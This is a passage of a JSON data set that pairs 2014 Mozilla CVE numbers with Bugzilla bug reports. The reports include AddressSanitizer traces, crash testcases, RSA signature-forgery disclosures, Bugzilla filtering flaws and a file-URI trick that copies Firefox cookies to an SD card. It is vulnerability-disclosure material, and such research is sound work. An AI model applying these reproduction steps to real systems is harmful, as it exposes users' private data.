in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) js/xpconnect/src/XPCWrappedNative.cpp:2395 #11 0x7f779bd8e0ae in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1273 #12 0x7f77a06bd843 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jscntxtinlines.h:239 #13 0x7f77a06b1774 in Interpret(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:2581 #14 0x7f77a069615c in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:422 #15 0x7f77a06bdd91 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:494 #16 0x7f77a03ca040 in js::CallOrConstructBoundFunction(JSContext*, unsigned int, JS::Value*) js/src/jsfun.cpp:1401 #17 0x7f77a06bd843 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jscntxtinlines.h:239 #18 0x7f77a0659b1e in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:531 #19 0x7f77a05ba765 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:448 #20 0x7f77a0538195 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:2663 #21 0x7f77a053e354 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) js/src/jsproxy.cpp:3066 #22 0x7f77a06bd843 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jscntxtinlines.h:239 #23 0x7f77a06b1774 in Interpret(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:2581 #24 0x7f77a069615c in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:422 #25 0x7f77a06bdd91 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:494 #26 0x7f77a0659b1e in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:531 #27 0x7f77a034bdb5 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) js/src/jsapi.cpp:5214 #28 0x7f779ad89131 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) objdir-ff-asan/dom/bindings/./EventHandlerBinding.cpp:35 #29 0x7f779c2a96ef in JS::Value mozilla::dom::EventHandlerNonNull::Call<nsISupports*>(nsISupports* const&, mozilla::dom::Event&, mozilla::ErrorResult&, mozilla::dom::CallbackObject::ExceptionHandling) objdir-ff-asan/dom/events/../../dist/include/mozilla/dom/EventHandlerBinding.h:62 previously allocated by thread T0 here: #0 0x473df1 in malloc _asan_rtl_ #1 0x7f77a3bc6a4d in moz_xmalloc memory/mozalloc/mozalloc.cpp:52 #2 0x7f779d09e654 in mozilla::DOMSVGLength::GetTearOff(nsSVGLength2*, nsSVGElement*, bool) objdir-ff-asan/content/svg/content/src/../../../../dist/include/mozilla/mozalloc.h:201 #3 0x7f779d1e232f in nsSVGLength2::ToDOMAnimVal(mozilla::DOMSVGLength**, nsSVGElement*) content/svg/content/src/nsSVGLength2.cpp:336 #4 0x7f779d108850 in mozilla::dom::SVGAnimatedLength::AnimVal() content/svg/content/src/SVGAnimatedLength.cpp:37 #5 0x7f779b446989 in mozilla::dom::SVGAnimatedLengthBinding::get_animVal(JSContext*, JS::Handle<JSObject*>, mozilla::dom::SVGAnimatedLength*, JSJitGetterCallArgs) objdir-ff-asan/dom/bindings/./SVGAnimatedLengthBinding.cpp:48 #6 0x7f779b95bdfc in mozilla::dom::GenericBindingGetter(JSContext*, unsigned int, JS::Value*) dom/bindings/BindingUtils.cpp:2280 #7 0x7f77a06bd843 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jscntxtinlines.h:239 #8 0x7f77a0659b1e in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:531 #9 0x7f77a06bf5fd in js::InvokeGetterOrSetter(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:603 #10 0x7f77a04799ff in js::baseops::GetProperty(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) js/src/vm/Shape-inl.h:46 #11 0x7f77a06b0e19 in Interpret(JSContext*, js::RunState&) js/src/jsobj.h:984 #12 0x7f77a069615c in js::RunScript(JSContext*, js::RunState&) js/src/vm/Interpreter.cpp:422 #13 0x7f77a06bdd91 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/vm/Interpreter.cpp:494 #14 0x7f77a0659b1e in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) js/src/vm/Interpreter.cpp:531 #15 0x7f77a034bdb5 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) js/src/jsapi.cpp:5214 #16 0x7f779ad89131 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) objdir-ff-asan/dom/bindings/./EventHandlerBinding.cpp:35 #17 0x7f779c2a96ef in JS::Value mozilla::dom::EventHandlerNonNull::Call<nsISupports*>(nsISupports* const&, mozilla::dom::Event&, mozilla::ErrorResult&, mozilla::dom::CallbackObject::ExceptionHandling) objdir-ff-asan/dom/events/../../dist/include/mozilla/dom/EventHandlerBinding.h:62 #18 0x7f779c2a7c0f in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) dom/events/JSEventHandler.cpp:214 #19 0x7f779c2767d0 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) dom/events/EventListenerManager.cpp:950 #20 0x7f779c277b40 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) dom/events/EventListenerManager.cpp:1011 #21 0x7f779c268a01 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) dom/events/EventDispatcher.cpp:287 #22 0x7f779c26cb26 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsCOMArray<mozilla::dom::EventTarget>*) dom/events/EventDispatcher.cpp:597 #23 0x7f779d7ad394 in nsDocumentViewer::LoadComplete(tag_nsresult) layout/base/nsDocumentViewer.cpp:1004 #24 0x7f779e42970b in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, tag_nsresult) docshell/base/nsDocShell.cpp:6963 #25 0x7f779e426899 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) docshell/base/nsDocShell.cpp:6762 #26 0x7f779e426cff in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, tag_nsresult) docshell/base/nsDocShell.cpp:6769 #27 0x7f779a2d0abb in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, tag_nsresult) uriloader/base/nsDocLoader.cpp:1268 #28 0x7f779a2cfe02 in nsDocLoader::doStopDocumentLoad(nsIRequest*, tag_nsresult) uriloader/base/nsDocLoader.cpp:850 #29 0x7f779a2cd9a3 in nsDocLoader::DocLoaderIsEmpty(bool) uriloader/base/nsDocLoader.cpp:740 SUMMARY: AddressSanitizer: heap-use-after-free ??:0 ?? Shadow bytes around the buggy address: 0x0c0e800454d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0e800454e0: fa fa 00 00 00 00 00 00 00 00 00 00 fa fa fa fa 0x0c0e800454f0: fd fd fd fd fd fd fd fd fd fd fa fa fa fa 00 00 0x0c0e80045500: 00 00 00 00 00 00 00 00 fa fa fa fa fd fd fd fd 0x0c0e80045510: fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd =>0x0c0e80045520: fd fd fd fd fa fa fa fa fd fd fd fd fd[fd]fd fd 0x0c0e80045530: fd fd fa fa fa fa 00 00 00 00 00 00 00 00 00 fa 0x0c0e80045540: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 fa fa 0x0c0e80045550: fa fa 00 00 00 00 00 00 00 00 00 00 fa fa fa fa 0x0c0e80045560: fd fd fd fd fd fd fd fd fd fd fa fa fa fa 00 00 0x0c0e80045570: 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Contiguous container OOB:fc ASan internal: fe ==6521==ABORTING"
      }
    ],
    "CVE-2014-1565": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1047831",
        "title": "Out-of-bounds Read in mozilla::dom::AudioEventTimeline<mozilla::ErrorResult>::ExtractValueFromCurve",
        "description": "Stacktrace: (from FatalSignalHandler): Assertion failure: ratio >= 0.0 (Ratio can never be negative here), at ../../../dist/include/AudioEventTimeline.h:425 #5 mozilla::dom::AudioEventTimeline<mozilla::ErrorResult>::ExtractValueFromCurve (startTime=<optimized out>, aCurve=<optimized out>, aCurveLength=<optimized out>, duration=<optimized out>, t=<optimized out>) at ../../../dist/include/AudioEventTimeline.h:425 #6 0x00007f04e6ecfdee in mozilla::dom::AudioEventTimeline<mozilla::ErrorResult>::GetValueAtTime<double> ( this=0x60c0003115e0, aTime=-nan(0xfffffffffffff)) at ../../../dist/include/AudioEventTimeline.h:258 #7 0x00007f04e6ebf8a7 in mozilla::dom::BiquadFilterNode::GetFrequencyResponse (this=0x610000153e40, aFrequencyHz=..., aMagResponse=..., aPhaseResponse=...) at /builds/slave/m-cen-l64-asan-d-ntly-00000000/build/content/media/webaudio/BiquadFilterNode.cpp:338 #8 0x00007f04e55f777c in mozilla::dom::BiquadFilterNodeBinding::getFrequencyResponse (cx=0x615000ac5b00, self=<optimized out>, args=..., obj=...) at ./BiquadFilterNodeBinding.cpp:256 ..."
      }
    ],
    "CVE-2014-1566": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1050690",
        "title": "Download arbitrary files to SD card via additional slashes in file: URI",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 Steps to reproduce: If we input the URL in the address bar such as: file:///data/data/org.mozilla.firefox/files/mozilla/xxxxxxxx.default/cookies.sqlite the download will not be invoked because the update in Firefox 28.0.1 But we can simply add ‘/’ before folders in the URL: file:////data/data/org.mozilla.firefox/files/mozilla/gnxblohb.default/cookies.sqlite Actual results: The cookies will be automatically downloaded in the SDcard so that all apps in the devices get access to the cookies which save users privacy information. Expected results: No matter what users input in the address bar, the cookies should not be downloaded into SDcard."
      }
    ],
    "CVE-2014-1568": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1069405",
        "title": "PKCS#1 v1.5 RSA signature verification vulnerabilities due to ASN.1 parsing of DigestInfo",
        "description": "From: Intel Product Security Incident Response Team <Intel.Product.Security.Incident.Response.Team@intel.com> To: \"'security@mozilla.org'\" <security@mozilla.org> Subject: NSS Issue ------/------ Intel Security’s Advanced Threat Research (ATR) team has discovered a variant of the signature forgery attack previously published by Daniel Bleichenbacher, which enables this attack to be used to forge RSA certificates on multiple crypto libraries with incorrect implementation of verification. Due to the way affected libraries parse BER encoded fields, it is possible for an attacker to skip garbage bytes, enabling signature forgery. These attacks target RSA keys with a low exponent (such as 3). The vulnerability is due to the implementation of signature checking in particular crypto libraries; each library must be assessed separately for the conditions that allow for the issue. For that reason, the Intel ATR team continues to assess many other libraries. Intel's ATR team has recently determined Mozilla NSS to be vulnerable, and the team has a proof of concept using Firefox root certificates. Details are in the attached document. NOTE: This vulnerability has not been shared publicly, but the team plans to publish eventually. Because a large number of people/products may embed vulnerable libraries and thereby be affected by this issue, Intel PSIRT has requested that CERT/CC lead the coordination of this issue and assign CVEs. They will likely contact you shortly. Please contact Intel PSIRT at secure@intel.com for updates or additional information. Our PGP key can be retrieved from our website https://security-center.intel.com/PGPPublicKey.aspx. Thank you, - John Intel PSIRT gpgkeys: key 52E518C5C7B0C436 not found on keyserver"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1064636",
        "title": "RSA PKCS#1 signature verification forgery is possible due to too-permissive SignatureAlgorithm parameter parsing",
        "description": "In bug 1054659 comment 20, Antoine Delignat-Lavaud wrote: > It is indeed possible to attack RSA-PKCS#1v1.5 in NSS. > Earlier you pointed me to the file nss/lib/cryptohi/secvfy.c for signature > verification. Near the top of the file there's a function with this > interesting comment: > > /* make sure the \"parameters\" are not too bogus. */ > if (di->digestAlgorithm.parameters.len > 2) { > goto sigloser; > } > > This allows PKCS#1 signatures to include up to two arbitrary parameters in > the unpadded ASN.1 structure, instead of the required NULL. This is quite > bad, because it opens up a Beichenbacher-like attack: using the homomorphic > signature property of RSA, it is possible to build from one or more valid > signatures, more valid signatures for a different hash, or even for a > different hash function. Thus, the attack I described above is in fact > possible even against RSA-PKCS#1. > > Even though we initially thought this was a new variant, it turns out that > it was in fact already described by Oiwa et al. in the GNUTLS-SA-2006-4 > report. Instead of explaining how it works precisely, I urge you to read > section 5 of > https://www.cdc.informatik.tu-darmstadt.de/reports/reports/sigflaw.pdf which > provides an excellent description of a practical exploit against e=3 > signatures. However, please note that we were able to create a proof of > concept even for a e=65537 signature. Let me know if you'd like me to attach > it for a test case - we confirmed that neither IE/schannel nor OpenSSL, nor > GnuTLS are vulnerable. Antoine, please attach it to this bug. Thanks! When you say \"up to two arbitrary parameters,\" you actually mean one parameter of at most two arbitrary bytes, right?"
      }
    ],
    "CVE-2014-1571": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1064140",
        "title": "[SECURITY] Private comments can be shown to flagmail recipients who aren't in the insider group",
        "description": "template/en/default/email/flagmail.txt.tmpl has: > [% IF Bugzilla.cgi.param(\"comment\").defined && Bugzilla.cgi.param(\"comment\").length > 0 %] > ------- Additional Comments from [% user.identity %] > [%+ Bugzilla.cgi.param(\"comment\") FILTER strip_control_chars %] it's highly likely this will not work for API driven updates."
      }
    ],
    "CVE-2014-1572": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1074812",
        "title": "[SECURITY] The 'realname' parameter is not correctly filtered on user account creation, leading to user data override",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36 Steps to reproduce: Hello, My name is Netanel Rubin, I work as a vulnerability researcher at Check Point Software Technologies. This is a critical vulnerability report for an issue I discovered in the Bugzilla platform. The successful exploitation of the vulnerability allows the manipulation of any DB field at the user creation procedure, including the 'login_name' field. This breaks the email validation process, and allows an attacker to create accounts which match the groups regex policies, effectively becoming a privileged user. As a PoC, I've created test accounts under bugzilla.mozilla.org: - admin@mozilla.com - admin@mozilla.org - admin@bugzilla.org - admin@bugzilla.bugs All of them have 'Admin' as a real name. Please remove these accounts as they were only meant to verify the issue. We would like to report the complete vulnerability description over a private channel. Please contact us at netanelr@checkpoint.com and shahartal@checkpoint.com (my team leader). Please assign a CVE number for this issue. We would also like to coordinate the public disclosure with you. Best regards, Netanel. Actual results: I was able to control every DB field in the user creation process, bypassing email verification."
      }
    ],
    "CVE-2014-1573": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1075578",
        "title": "[SECURITY] Improper filtering of CGI arguments",
        "description": "I wrote a test in bug 1074980 to catch the |foo => $cgi->param()| syntax, and it found 15 places which use this syntax. The first one I checked is already exploitable (XSS), and I didn't look at the other ones yet. I think things are worse than expected in bug 1074812. I will comment in this bug when new vulnerabilities are found, and will also update my patch accordingly."
      }
    ],
    "CVE-2014-1575": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1033020",
        "title": "Make BaslineFrame::returnValue match InterpreterFrame::returnValue",
        "description": "Right now, if you access BaselineFrame::returnValue and !hasReturnValue, you get random stack data (note, this should at least have had an assertion). On the other hand, it is safe to call InterpreterFrame::returnValue whenever: it will just give back UndefinedValue. This makes AbstractFramePointer's wrapper have inconsistent behavior. In particular, Debugger::slowPathOnLeaveFrame was not checking hasReturnValue, causing exception aborts in the debugger with jit frames on stack to read random memory from the stack as a Value. I think the right fix here is to make both frame classes behave the same."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1018916",
        "title": "Assertion failure: IsObjectValueInCompartment(value, compartment())",
        "description": "found via bughunter on http://www.sherwin-williams.com/store-locator/ loading this site / or reloading cause Assertion failure: IsObjectValueInCompartment(value, compartment()), at c:\\work\\mozilla\\builds\\nightly\\mozilla\\js\\src\\vm/ObjectImpl.h:731"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1001994",
        "title": "crash in libsystem_kernel.dylib@0x15866 on printing with position: sticky",
        "description": "See testcase, which crashes on printing or print preview. This bug was filed from the Socorro interface and is report bp-44611da7-eede-4bd8-98e8-73db42140427. ============================================================= 0 libsystem_kernel.dylib libsystem_kernel.dylib@0x15866 1 libsystem_pthread.dylib libsystem_pthread.dylib@0x235c 2 libc++abi.dylib libc++abi.dylib@0x27726 3 libsystem_c.dylib libsystem_c.dylib@0x5cb1a 4 libc++abi.dylib libc++abi.dylib@0x27726 5 libc++abi.dylib libc++abi.dylib@0xf31 6 XUL nsStyleContext::~nsStyleContext() obj-firefox/x86_64/dist/include/nsCOMPtr.h 7 libc++abi.dylib libc++abi.dylib@0x25447 8 XUL nsLayoutUtils::GetNearestScrollableFrame(nsIFrame*, unsigned int) layout/generic/nsQueryFrame.h 9 XUL mozilla::StickyScrollContainer::GetStickyScrollContainerForFrame(nsIFrame*) layout/generic/StickyScrollContainer.cpp 10 XUL nsFrame::DestroyFrom(nsIFrame*) layout/generic/nsFrame.cpp"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1020034",
        "title": "TypedArray::WrapIntoNewCompartment is broken",
        "description": "It acts upon mObj, then it writes the new wrapped value into mObj. But ComputeLengthAndData acts upon mObj, *after* that wrapping has happened, in the case of methods called via xrays. Apparently we have no tests at all that exercise a WebIDL-implemented method, on an xray-wrapped object, that passes it a typed array or ArrayBuffer. Joy. Madness. Inconceivable."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1032208",
        "title": "Assertion failure: v.isObject(), at json.cpp:508 or Crash [@ GetObjectClass] or Crash [@ js::ObjectClassIs] with Symbol and JSON",
        "description": "The following testcase asserts on mozilla-central revision b6408c32a170 (run with --fuzzing-safe --ion-eager): JSON.stringify(Symbol());"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1034230",
        "title": "[cairo] Potential use of uninitialized |stack| in cairo_type1_font_subset_look_for_seac",
        "description": "In |cairo_type1_font_subset_look_for_seac| under case TYPE1_CHARSTRING_COMMAND_SEAC |stack[3]| and |stack[4]| are accessed with no guarantee they are initialized. http://dxr.mozilla.org/mozilla-central/source/gfx/cairo/cairo/src/cairo-type1-subset.c#842,873,877"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1023035",
        "title": "Assertion failure: CurrentThreadCanAccessRuntime(rt), at /js/src/jsgc.cpp:2141",
        "description": "Encounter this while executing mochitest on b2g-desktop debug build. https://tbpl.mozilla.org/php/getParsedLog.php?id=41355834&tree=Try&full=1#error2 06:54:12 INFO - 0 libxul.so!js::gc::GCRuntime::triggerGC(JS::gcreason::Reason) [jsgc.cpp:7e27d78d3629 : 2141 + 0x18] 06:54:12 INFO - eip = 0xb55fed91 esp = 0xb11cf1b0 ebp = 0xb11cf1d8 ebx = 0xb6bd4ca4 06:54:12 INFO - esi = 0x00000000 edi = 0xafec71c0 eax = 0x00000000 ecx = 0xb759d8ac 06:54:12 INFO - edx = 0x00000000 efl = 0x00210282 06:54:12 INFO - Found by: given as instruction pointer in context 06:54:12 INFO - 1 libxul.so!js::gc::GCRuntime::onTooMuchMalloc() [jsgc.cpp:7e27d78d3629 : 1514 + 0xc] 06:54:12 INFO - eip = 0xb56075ca esp = 0xb11cf1e0 ebp = 0xb11cf1f8 ebx = 0xb6bd4ca4 06:54:12 INFO - esi = 0xafec7c60 edi = 0x0004d316 06:54:12 INFO - Found by: call frame info 06:54:12 INFO - 2 libxul.so!js::ScriptSource::ensureOwnsSource(js::ExclusiveContext*) [jscntxt.h:7e27d78d3629 : 274 + 0x14] 06:54:12 INFO - eip = 0xb56b9c22 esp = 0xb11cf200 ebp = 0xb11cf238 ebx = 0xb6bd4ca4 06:54:12 INFO - esi = 0x9c4693a0 edi = 0x0004d316 06:54:12 INFO - Found by: call frame info 06:54:12 INFO - 3 libxul.so!js::frontend::CompileScript(js::ExclusiveContext*, js::LifoAlloc*, JS::Handle<JSObject*>, JS::Handle<JSScript*>, JS::ReadOnlyCompileOptions const&, JS::SourceBufferHolder&, JSString*, unsigned int, js::SourceCompressionTask*) [BytecodeCompiler.cpp:7e27d78d3629 : 256 + 0x30] 06:54:12 INFO - eip = 0xb5884181 esp = 0xb11cf240 ebp = 0xb11d0228 ebx = 0xb6bd4ca4 06:54:12 INFO - esi = 0x9c4693a0 edi = 0xa72c3a00 06:54:12 INFO - Found by: call frame info 06:54:12 INFO - 4 libxul.so!js::HelperThread::handleParseWorkload() [HelperThreads.cpp:7e27d78d3629 : 907 + 0x41] 06:54:12 INFO - eip = 0xb5759d68 esp = 0xb11d0230 ebp = 0xb11d0298 ebx = 0xb6bd4ca4 06:54:12 INFO - esi = 0xb71b9540 edi = 0x9cbf9200 06:54:12 INFO - Found by: call frame info 06:54:12 INFO - 5 libxul.so!js::HelperThread::threadLoop() [HelperThreads.cpp:7e27d78d3629 : 1089 + 0xa] 06:54:12 INFO - eip = 0xb575a300 esp = 0xb11d02a0 ebp = 0xb11d02e8 ebx = 0xb6bd4ca4 06:54:12 INFO - esi = 0xb105be00 edi = 0x00000000 06:54:12 INFO - Found by: call frame info"
      }
    ],
    "CVE-2014-1576": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1041512",
        "title": "Heap-buffer-overflow in nsTransformedTextRun::SetCapitalization",
        "description": "Tested on: OS: Ubuntu 12.04 Firefox: ASAN debug prebuild from https://ftp.mozilla.org/pub/mozilla.org/firefox/tinderbox-builds/mozilla-central-linux64-asan-debug/1405918761/ Sometimes the repro-file fails to trigger the crash. If the crash doesn't occur after couple of refresh, restart the browser. Also the crash reproduces a lot more reliably with debug-build than with opt-build. ASAN trace: [7111] ###!!! ASSERTION: Text run should be transformed!: 'mTextRun->GetFlags() & nsTextFrameUtils::TEXT_IS_TRANSFORMED', file /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp, line 970 ================================================================= ==7111==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60c0002d1a40 at pc 0x7fdb4338f050 bp 0x7fffaeeeb670 sp 0x7fffaeeeb668 READ of size 8 at 0x60c0002d1a40 thread T0 #0 0x7fdb4338f04f in nsTArray_base<nsTArrayInfallibleAllocator, nsTArray_CopyWithMemutils>::Length() const /builds/slave/m-cen-l64-asan-d-0000000000000/build/xpcom/build/../glue/nsTArray.h:323 #1 0x7fdb433fe598 in nsTArray_base<nsTArrayInfallibleAllocator, nsTArray_CopyWithMemutils>::IsEmpty() const /builds/slave/m-cen-l64-asan-d-0000000000000/build/obj-firefox/xpcom/base/../../dist/include/nsTArray.h:326 #2 0x7fdb47483e48 in nsTransformedTextRun::SetCapitalization(unsigned int, unsigned int, bool*, gfxContext*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextRunTransformations.cpp:60 #3 0x7fdb46783ded in nsLineBreaker::AppendText(nsIAtom*, char16_t const*, unsigned int, unsigned int, nsILineBreakSink*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsLineBreaker.cpp:291 #4 0x7fdb46784360 in nsLineBreaker::AppendText(nsIAtom*, unsigned char const*, unsigned int, unsigned int, nsILineBreakSink*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/content/base/src/nsLineBreaker.cpp:327 #5 0x7fdb4745ddca in BuildTextRunsScanner::SetupBreakSinksForTextRun(gfxTextRun*, void const*, unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:2399 #6 0x7fdb474580b1 in BuildTextRunsScanner::SetupLineBreakerContext(gfxTextRun*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:2304 #7 0x7fdb474574ea in BuildTextRunsScanner::FlushFrames(bool, bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:1453 #8 0x7fdb47460bee in BuildTextRuns(gfxContext*, nsTextFrame*, nsIFrame*, nsLineList_iterator const*, nsTextFrame::TextRunType) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:1401 #9 0x7fdb4745f4e8 in nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, gfxContext*, nsIFrame*, nsLineList_iterator const*, unsigned int*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:2559 #10 0x7fdb4747a49e in nsTextFrame::AddInlineMinWidthForFlow(nsRenderingContext*, nsIFrame::InlineMinWidthData*, nsTextFrame::TextRunType) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:7018 #11 0x7fdb4747b87f in nsTextFrame::AddInlineMinWidth(nsRenderingContext*, nsIFrame::InlineMinWidthData*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:7175 #12 0x7fdb4731cb1d in nsBlockFrame::GetMinWidth(nsRenderingContext*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsBlockFrame.cpp:733 . . . #60 0x7fdb48107135 in nsAppStartup::Run() /builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/components/startup/nsAppStartup.cpp:278 #61 0x7fdb47f69b3b in XREMain::XRE_mainRun() /builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsAppRunner.cpp:4013 #62 0x7fdb47f6af4f in XREMain::XRE_main(int, char**, nsXREAppData const*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsAppRunner.cpp:4084 #63 0x7fdb47f6b9d2 in XRE_main /builds/slave/m-cen-l64-asan-d-0000000000000/build/toolkit/xre/nsAppRunner.cpp:4298 #64 0x489fed in do_main(int, char**, nsIFile*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/browser/app/nsBrowserApp.cpp:282 #65 0x489571 in main /builds/slave/m-cen-l64-asan-d-0000000000000/build/browser/app/nsBrowserApp.cpp:643 #66 0x7fdb529e276c in ?? ??:0 #67 0x48925c in _start ??:0 0x60c0002d1a40 is located 0 bytes to the right of 128-byte region [0x60c0002d19c0,0x60c0002d1a40) allocated by thread T0 here: #0 0x471871 in __interceptor_malloc _asan_rtl_ #1 0x7fdb449893f8 in gfxTextRun::AllocateStorageForTextRun(unsigned long, unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/thebes/gfxFont.cpp:6461 #2 0x7fdb4497fb13 in gfxTextRun::Create(gfxTextRunFactory::Parameters const*, unsigned int, gfxFontGroup*, unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/thebes/gfxFont.cpp:6478 #3 0x7fdb44980f38 in gfxFontGroup::MakeTextRun(unsigned char const*, unsigned int, gfxTextRunFactory::Parameters const*, unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/gfx/thebes/gfxFont.cpp:5196 #4 0x7fdb4745d811 in gfxTextRun* MakeTextRun<unsigned char>(unsigned char const*, unsigned int, gfxFontGroup*, gfxTextRunFactory::Parameters const*, unsigned int) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:569 #5 0x7fdb47459dc5 in BuildTextRunsScanner::BuildTextRunForFrames(void*) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:2145 #6 0x7fdb47457642 in BuildTextRunsScanner::FlushFrames(bool, bool) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:1472 #7 0x7fdb47460bee in BuildTextRuns(gfxContext*, nsTextFrame*, nsIFrame*, nsLineList_iterator const*, nsTextFrame::TextRunType) /builds/slave/m-cen-l64-asan-d-0000000000000/build/layout/generic/nsTextFrame.cpp:1401 #8 0x7fdb4745f4e8 in 